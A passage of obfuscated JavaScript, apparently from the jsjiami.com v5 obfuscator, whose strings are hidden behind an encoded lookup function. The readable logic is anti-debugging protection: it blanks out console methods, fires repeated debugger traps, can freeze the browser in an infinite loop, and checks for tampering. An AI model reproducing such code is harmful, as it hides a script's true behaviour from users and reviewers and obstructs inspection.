_0x2597ac(_0x1ad1e8,_0x397477){return _0x1ad1e8===_0x397477;},'vphAe':_0x58d4('0x7d','dNhD'),'rhmQP':_0x58d4('0x7e','TAKE'),'QdXPN':_0x58d4('0x7f','bht3'),'yzFGk':function _0x49da8e(_0x30e785,_0x225f85){return _0x30e785(_0x225f85);},'OSKEb':_0x58d4('0x80','WDT5'),'cMNqf':function _0x21c03b(_0x313954,_0x2e566e){return _0x313954+_0x2e566e;},'JTMTH':_0x58d4('0x81','[Cni'),'Pbbqd':_0x58d4('0x82','mXvg'),'JTald':function _0x50468d(_0x442ab6,_0x27dca1){return _0x442ab6===_0x27dca1;},'SyEGp':_0x58d4('0x83','oRaz'),'VObII':_0x58d4('0x84','o[jS'),'aFpAj':function _0x4a7fb8(_0x252281,_0x586c1a){return _0x252281+_0x586c1a;},'AICqy':_0x58d4('0x85','#q9('),'hzXUG':function _0x30ac79(_0x2ccefe){return _0x2ccefe();},'lDpEu':function _0x479a4d(_0x565ec7){return _0x565ec7();}};if(_0x1579a8[_0x58d4('0x86','rRXH')](_0x1579a8[_0x58d4('0x87','rRXH')],_0x1579a8[_0x58d4('0x88','D&RT')])){var _0x50e818=new RegExp(_0x1579a8[_0x58d4('0x89','&rzY')]);var _0x605338=new RegExp(_0x1579a8[_0x58d4('0x8a','MFGc')],'i');var _0x3ab906=_0x1579a8[_0x58d4('0x8b','1NIb')](_0x45bc0e,_0x1579a8[_0x58d4('0x8c','&rzY')]);if(!_0x50e818[_0x58d4('0x8d','WDT5')](_0x1579a8[_0x58d4('0x8e','MFGc')](_0x3ab906,_0x1579a8[_0x58d4('0x8f','o#eb')]))||!_0x605338[_0x58d4('0x90','TAKE')](_0x1579a8[_0x58d4('0x91','MaJj')](_0x3ab906,_0x1579a8[_0x58d4('0x92','rRXH')]))){if(_0x1579a8[_0x58d4('0x93','o#eb')](_0x1579a8[_0x58d4('0x94','bEdN')],_0x1579a8[_0x58d4('0x95','d9@n')])){_0xcf6171[_0x307563](_0x1579a8[_0x58d4('0x96','o[jS')]('删除',_0x1579a8[_0x58d4('0x97','1FiT')]));}else{_0x1579a8[_0x58d4('0x98','gEbI')](_0x3ab906,'0');}}else{_0x1579a8[_0x58d4('0x99','c!5h')](_0x45bc0e);}}else{_0x1579a8[_0x58d4('0x9a','z5Qh')](_0x45bc0e);}})();}());continue;case'3':try{_0x307563+=_0x5316ef[_0x58d4('0x9b','ocq9')];_0x283e00=encode_version;if(!(_0x5316ef[_0x58d4('0x9c','[Cni')](typeof _0x283e00,_0x5316ef[_0x58d4('0x9d','rRXH')])&&_0x5316ef[_0x58d4('0x9e','rRXH')](_0x283e00,_0x5316ef[_0x58d4('0x9f','1FiT')]))){_0xcf6171[_0x307563](_0x5316ef[_0x58d4('0xa0','Q^QE')]('删除',_0x5316ef[_0x58d4('0xa1','d9@n')]));}}catch(_0x43eabc){_0xcf6171[_0x307563](_0x5316ef[_0x58d4('0xa2','D&RT')]);}continue;case'4':var _0x4d4174={'TyTUd':function _0x5cac80(_0x5efe0a,_0x2f8596,_0x7ea766){return _0x5316ef[_0x58d4('0xa3','^poc')](_0x5efe0a,_0x2f8596,_0x7ea766);},'DhAke':function _0x261a57(_0x3024e5,_0x5a1471){return _0x5316ef[_0x58d4('0xa4','c!5h')](_0x3024e5,_0x5a1471);},'xlXPI':_0x5316ef[_0x58d4('0xa5','ocq9')],'PCyqG':function _0x2d4211(_0x398144,_0x39a7c6){return _0x5316ef[_0x58d4('0xa6','#q9(')](_0x398144,_0x39a7c6);},'uWliE':_0x5316ef[_0x58d4('0xa7','$PyL')],'bgCRl':function _0x21f25e(_0x2d1e89,_0xeb07c4){return _0x5316ef[_0x58d4('0xa8','5RYv')](_0x2d1e89,_0xeb07c4);},'Setln':_0x5316ef[_0x58d4('0xa9','mXvg')],'BZnkL':function _0x44539a(_0x2be8f4,_0x437b42){return _0x5316ef[_0x58d4('0xaa','tmJ1')](_0x2be8f4,_0x437b42);},'nRwpn':_0x5316ef[_0x58d4('0xab','ocq9')],'JzjSu':_0x5316ef[_0x58d4('0xac','oRaz')],'qBIBV':function _0x26e622(_0xa80d33,_0x13de6d){return _0x5316ef[_0x58d4('0xad','z5Qh')](_0xa80d33,_0x13de6d);},'fvrWJ':function _0x456e10(_0x308903,_0x2a9150){return _0x5316ef[_0x58d4('0xae','tmJ1')](_0x308903,_0x2a9150);},'BDMQi':_0x5316ef[_0x58d4('0xaf','dNhD')],'Zarmd':function _0x5881d0(_0x2ac4ed,_0x452a79){return _0x5316ef[_0x58d4('0xb0','kT5Y')](_0x2ac4ed,_0x452a79);},'NcIzT':_0x5316ef[_0x58d4('0xb1','MFGc')]};continue;case'5':var _0x737048=_0x5316ef[_0x58d4('0xb2','1YV!')](_0x45df50,this,function(){var _0x5ab24e=function(){};var _0x210801=_0x4d4174[_0x58d4('0xb3','&r4b')](typeof window,_0x4d4174[_0x58d4('0xb4','ly2[')])?window:_0x4d4174[_0x58d4('0xb5','1FiT')](typeof process,_0x4d4174[_0x58d4('0xb6','Uslr')])&&_0x4d4174[_0x58d4('0xb7','o[jS')](typeof require,_0x4d4174[_0x58d4('0xb8','d9@n')])&&_0x4d4174[_0x58d4('0xb9','4FK@')](typeof global,_0x4d4174[_0x58d4('0xba','&r4b')])?global:this;if(!_0x210801[_0x58d4('0xbb','MFGc')]){if(_0x4d4174[_0x58d4('0xbc','bht3')](_0x4d4174[_0x58d4('0xbd','&rzY')],_0x4d4174[_0x58d4('0xbe','z5Qh')])){_0x210801[_0x58d4('0xbf','[Cni')]=function(_0x54bf78){var _0x41a45a={'wuKQt':_0x58d4('0xc0','Q^QE')};var _0x221b50=_0x41a45a[_0x58d4('0xc1','ocq9')][_0x58d4('0x36','1FiT')]('|'),_0x3a7c50=0x0;while(!![]){switch(_0x221b50[_0x3a7c50++]){case'0':var _0x307563={};continue;case'1':_0x307563[_0x58d4('0xc2','CTxL')]=_0x54bf78;continue;case'2':_0x307563[_0x58d4('0xc3','!![U')]=_0x54bf78;continue;case'3':_0x307563[_0x58d4('0xc4','!![U')]=_0x54bf78;continue;case'4':_0x307563[_0x58d4('0xc5','1FiT')]=_0x54bf78;continue;case'5':_0x307563[_0x58d4('0xc6','[Cni')]=_0x54bf78;continue;case'6':_0x307563[_0x58d4('0xc7','#q9(')]=_0x54bf78;continue;case'7':return _0x307563;case'8':_0x307563[_0x58d4('0xc8','mXvg')]=_0x54bf78;continue;}break;}}(_0x5ab24e);}else{if(_0x4d4174[_0x58d4('0xc9','4FK@')](_0x4d4174[_0x58d4('0xca','WDT5')]('',_0x4d4174[_0x58d4('0xcb','TAKE')](counter,counter))[_0x4d4174[_0x58d4('0xcc','d9@n')]],0x1)||_0x4d4174[_0x58d4('0xcd','zmBM')](_0x4d4174[_0x58d4('0xce','BJcI')](counter,0x14),0x0)){debugger;}else{debugger;}}}else{var _0x2b42ee=_0x4d4174[_0x58d4('0xcf','MFGc')][_0x58d4('0xd0','CTxL')]('|'),_0x529f48=0x0;while(!![]){switch(_0x2b42ee[_0x529f48++]){case'0':_0x210801[_0x58d4('0xd1','I]!c')][_0x58d4('0xd2','!![U')]=_0x5ab24e;continue;case'1':_0x210801[_0x58d4('0xd3','ocq9')][_0x58d4('0xd4','1NIb')]=_0x5ab24e;continue;case'2':_0x210801[_0x58d4('0xd5','kT5Y')][_0x58d4('0xd6','urd3')]=_0x5ab24e;continue;case'3':_0x210801[_0x58d4('0xd7','&rzY')][_0x58d4('0xd8','oRaz')]=_0x5ab24e;continue;case'4':_0x210801[_0x58d4('0xd9','1YV!')][_0x58d4('0xda','dNhD')]=_0x5ab24e;continue;case'5':_0x210801[_0x58d4('0xd1','I]!c')][_0x58d4('0xc3','!![U')]=_0x5ab24e;continue;case'6':_0x210801[_0x58d4('0xd1','I]!c')][_0x58d4('0xdb','!![U')]=_0x5ab24e;continue;}break;}}});continue;case'6':var _0x57155b=function(){var _0x54df06={'HIbjs':function _0x33bcf5(_0x2686cd,_0x2731c1){return _0x2686cd===_0x2731c1;},'yjgoR':_0x58d4('0xdc','MaJj')};if(_0x54df06[_0x58d4('0xdd','urd3')](_0x54df06[_0x58d4('0xde','c!5h')],_0x54df06[_0x58d4('0xdf','#1Xm')])){var _0x1695f9=!![];return function(_0x41de96,_0x5aa556){var _0x14c003={'ItVVr':function _0x8d3564(_0x1cfb90,_0x2c356d){return _0x1cfb90!==_0x2c356d;},'jjxCW':_0x58d4('0xe0','73TP'),'KbYNK':_0x58d4('0xe1','*PXP'),'TQDnJ':_0x58d4('0xe2','ELdG')};var _0x531a5c=_0x1695f9?function(){if(_0x5aa556){if(_0x14c003[_0x58d4('0xe3','urd3')](_0x14c003[_0x58d4('0xe4','MFGc')],_0x14c003[_0x58d4('0xe5','1FiT')])){var _0x3b0fe6=_0x5aa556[_0x58d4('0xe6','#1Xm')](_0x41de96,arguments);_0x5aa556=null;return _0x3b0fe6;}else{var _0x49e6ca=_0x14c003[_0x58d4('0xe7','WDT5')][_0x58d4('0xe8','urd3')]('|'),_0x4e4b2c=0x0;while(!![]){switch(_0x49e6ca[_0x4e4b2c++]){case'0':var _0x1f3ae2={};continue;case'1':_0x1f3ae2[_0x58d4('0xe9','urd3')]=func;continue;case'2':_0x1f3ae2[_0x58d4('0xea','rRXH')]=func;continue;case'3':_0x1f3ae2[_0x58d4('0xeb','oRaz')]=func;continue;case'4':_0x1f3ae2[_0x58d4('0xec','D&RT')]=func;continue;case'5':_0x1f3ae2[_0x58d4('0xed','oRaz')]=func;continue;case'6':_0x1f3ae2[_0x58d4('0xee','ELdG')]=func;continue;case'7':_0x1f3ae2[_0x58d4('0xef','rRXH')]=func;continue;case'8':return _0x1f3ae2;}break;}}}}:function(){};_0x1695f9=![];return _0x531a5c;};}else{if(fn){var _0x5e4a70=fn[_0x58d4('0xf0','o#eb')](context,arguments);fn=null;return _0x5e4a70;}}}();continue;case'7':var _0x45df50=function(){var _0x42d93d={'xBbfx':function _0x1d137d(_0x4966e6,_0x312003){return _0x4966e6===_0x312003;},'ALoAF':_0x58d4('0xf1','D&RT')};if(_0x42d93d[_0x58d4('0xf2','ELdG')](_0x42d93d[_0x58d4('0xf3','bht3')],_0x42d93d[_0x58d4('0xf4','&rzY')])){var _0x421fe8=!![];return function(_0x3636a2,_0x447976){var _0x36d579={'qKghx':function _0x208d10(_0x27368f,_0x50c74b){return _0x27368f!==_0x50c74b;},'tlLbJ':_0x58d4('0xf5','1YV!'),'jIpwK':function _0x27d1c3(_0x20dee6,_0x367b6f){return _0x20dee6===_0x367b6f;},'KjXaH':_0x58d4('0xf6','o[jS'),'wTTMu':function _0x2a9a46(_0x3930f5,_0x55082a){return _0x3930f5!==_0x55082a;},'wjNql':_0x58d4('0xf7','ly2['),'EpIco':function _0x12e2bf(_0x4eef19){return _0x4eef19();}};if(_0x36d579[_0x58d4('0xf8','dNhD')](_0x36d579[_0x58d4('0xf9','ME#[')],_0x36d579[_0x58d4('0xfa','u0KR')])){_0x36d579[_0x58d4('0xfb','$PyL')](_0x45bc0e);}else{var _0x4c2f63=_0x421fe8?function(){if(_0x447976){if(_0x36d579[_0x58d4('0xfc','oRaz')](_0x36d579[_0x58d4('0xfd','1FiT')],_0x36d579[_0x58d4('0xfe','ewYA')])){}else{var _0x5b1316=_0x447976[_0x58d4('0xff','4FK@')](_0x3636a2,arguments);_0x447976=null;return _0x5b1316;}}}:function(){if(_0x36d579[_0x58d4('0x100','ELdG')](_0x36d579[_0x58d4('0x101','MFGc')],_0x36d579[_0x58d4('0x102','zmBM')])){}else{}};_0x421fe8=![];return _0x4c2f63;}};}else{}}();continue;}break;}}(window));function _0x45bc0e(_0x3f3bda){var _0x24e542={'pcWpa':function _0x401920(_0xa80094,_0x1b3e6a){return _0xa80094===_0x1b3e6a;},'LOLcC':_0x58d4('0x103','1FiT'),'xlQEf':_0x58d4('0x104','bEdN'),'isOmm':function _0x2a96a6(_0x3b1217,_0x5e3519){return _0x3b1217(_0x5e3519);}};function _0x3ca401(_0x23c9b4){var _0x3c3236={'dlaOb':function _0x209038(_0x114f66,_0x4457e6){return _0x114f66===_0x4457e6;},'Jkrgf':_0x58d4('0x105','&r4b'),'dgtHq':function _0x455e0c(_0x5d6c86,_0x39d1bb){return _0x5d6c86===_0x39d1bb;},'okHrp':_0x58d4('0x106','1YV!'),'hGxIv':function _0x57c16d(_0x41e1f9){return _0x41e1f9();},'UlzUz':function _0x5f5420(_0x3f36b5,_0x149e33){return _0x3f36b5!==_0x149e33;},'EwnTW':function _0x25f185(_0x446faf,_0x50cc9e){return _0x446faf+_0x50cc9e;},'xYUMt':function _0x45793f(_0x151177,_0x17ea42){return _0x151177/_0x17ea42;},'vXfzI':_0x58d4('0x107','mXvg'),'REPYY':function _0x549b62(_0x19d50a,_0x10a8bb){return _0x19d50a%_0x10a8bb;},'xcNSN':function _0x11ea9f(_0x5b6823,_0x55eb14){return _0x5b6823===_0x55eb14;},'WtEqC':_0x58d4('0x108','ewYA'),'vMwQV':_0x58d4('0x109','MFGc'),'fuTYM':function _0x311acb(_0x305988,_0x3d936f){return _0x305988(_0x3d936f);},'WlodF':_0x58d4('0x10a','CTxL'),'DsRNK':_0x58d4('0x10b','5RYv'),'sAoOC':function _0x3ecb8b(_0x5bf760,_0x47a211){return _0x5bf760(_0x47a211);},'ynwpE':_0x58d4('0x10c','o#eb'),'tiatu':function _0x405ec3(_0x249c81,_0x45e555){return _0x249c81(_0x45e555);},'OCZzK':function _0x20b3c8(_0xe942b9,_0x372fe2){return _0xe942b9(_0x372fe2);}};if(_0x3c3236[_0x58d4('0x10d','gEbI')](_0x3c3236[_0x58d4('0x10e','rRXH')],_0x3c3236[_0x58d4('0x10f','#q9(')])){if(_0x3c3236[_0x58d4('0x110','5RYv')](typeof _0x23c9b4,_0x3c3236[_0x58d4('0x111','tmJ1')])){var _0x21e3bd=function(){while(!![]){}};return _0x3c3236[_0x58d4('0x112','urd3')](_0x21e3bd);}else{if(_0x3c3236[_0x58d4('0x113','bEdN')](_0x3c3236[_0x58d4('0x114','c!5h')]('',_0x3c3236[_0x58d4('0x115','urd3')](_0x23c9b4,_0x23c9b4))[_0x3c3236[_0x58d4('0x116','mXvg')]],0x1)||_0x3c3236[_0x58d4('0x117','MaJj')](_0x3c3236[_0x58d4('0x118','TAKE')](_0x23c9b4,0x14),0x0)){if(_0x3c3236[_0x58d4('0x119','&r4b')](_0x3c3236[_0x58d4('0x11a','Q^QE')],_0x3c3236[_0x58d4('0x11b','d9@n')])){debugger;}else{var _0x10376c=_0x3c3236[_0x58d4('0x11c','1YV!')];_0x3c3236[_0x58d4('0x11d','z5Qh')]($,_0x3c3236[_0x58d4('0x11e','6(3a')])[_0x58d4('0x11f','ELdG')](_0x3c3236[_0x58d4('0x120','WDT5')]);_0x3c3236[_0x58d4('0x121','$PyL')]($,_0x3c3236[_0x58d4('0x122','oRaz')])[_0x58d4('0x123','5RYv')]();_0x3c3236[_0x58d4('0x124','bEdN')]($,document)[_0x58d4('0x125','$PyL')](function(){var _0x1f4ce2={'fVyIW':function _0x2b8217(_0x1e3241,_0x6399d7){return _0x1e3241(_0x6399d7);},'EosqZ':_0x58d4('0x126','Q^QE'),'ZlLJX':function _0x4ea6d0(_0x12514b,_0x3b6033){return _0x12514b+_0x3b6033;},'PIwIL':_0x58d4('0x127','4FK@'),'QAdMF':_0x58d4('0x128','ocq9'),'XowkU':function _0x1f2e75(_0x5dccfe,_0x131310){return _0x5dccfe(_0x131310);},'elpkY':_0x58d4('0x129','urd3'),'foxgm':_0x58d4('0x12a','mXvg'),'PeFPM':_0x58d4('0x12b','!![U')};_0x1f4ce2[_0x58d4('0x12c','*PXP')]($,_0x1f4ce2[_0x58d4('0x12d','Uslr')])[_0x58d4('0x1f','&r4b')](_0x1f4ce2[_0x58d4('0x12e','bEdN')](_0x1f4ce2[_0x58d4('0x12f','tmJ1')](_0x1f4ce2[_0x58d4('0x130','WDT5')],_0x10376c),_0x1f4ce2[_0x58d4('0x131','Uslr')]))[_0x58d4('0x132','1FiT')]();_0x1f4ce2[_0x58d4('0x133','ocq9')]($,_0x1f4ce2[_0x58d4('0x134','!![U')])[_0x58d4('0x135','rRXH')](_0x1f4ce2[_0x58d4('0x136','$PyL')],_0x1f4ce2[_0x58d4('0x137','1NIb')]);});}}else{debugger;}}_0x3c3236[_0x58d4('0x138','MFGc')](_0x3ca401,++_0x23c9b4);}else{if(fn){var _0x18488b=fn[_0x58d4('0x139','kT5Y')](context,arguments);fn=null;return _0x18488b;}}}try{if(_0x3f3bda){if(_0x24e542[_0x58d4('0x13a','u0KR')](_0x24e542[_0x58d4('0x13b','urd3')],_0x24e542[_0x58d4('0x13c','gEbI')])){that[_0x58d4('0x13d','z5Qh')]=function(_0x487db4){var _0x408f24={'LmeEn':_0x58d4('0x13e','1NIb')};var _0x4643be=_0x408f24[_0x58d4('0x13f','dNhD')][_0x58d4('0x140','kT5Y')]('|'),_0x3ce830=0x0;while(!![]){switch(_0x4643be[_0x3ce830++]){case'0':_0x4e6b2f[_0x58d4('0x141','1FiT')]=_0x487db4;continue;case'1':_0x4e6b2f[_0x58d4('0x142','*PXP')]=_0x487db4;continue;case'2':var _0x4e6b2f={};continue;case'3':_0x4e6b2f[_0x58d4('0x143','rRXH')]=_0x487db4;continue;case'4':_0x4e6b2f[_0x58d4('0x144','4FK@')]=_0x487db4;continue;case'5':_0x4e6b2f[_0x58d4('0x145','oRaz')]=_0x487db4;continue;case'6':_0x4e6b2f[_0x58d4('0x146','mWNT')]=_0x487db4;continue;case'7':_0x4e6b2f[_0x58d4('0x147','Q^QE')]=_0x487db4;continue;case'8':return _0x4e6b2f;}break;}}(func);}else{return _0x3ca401;}}else{_0x24e542[_0x58d4('0x148','73TP')](_0x3ca401,0x0);}}catch(_0x56f9dd){}};encode_version = 'jsjiami.com.v5';
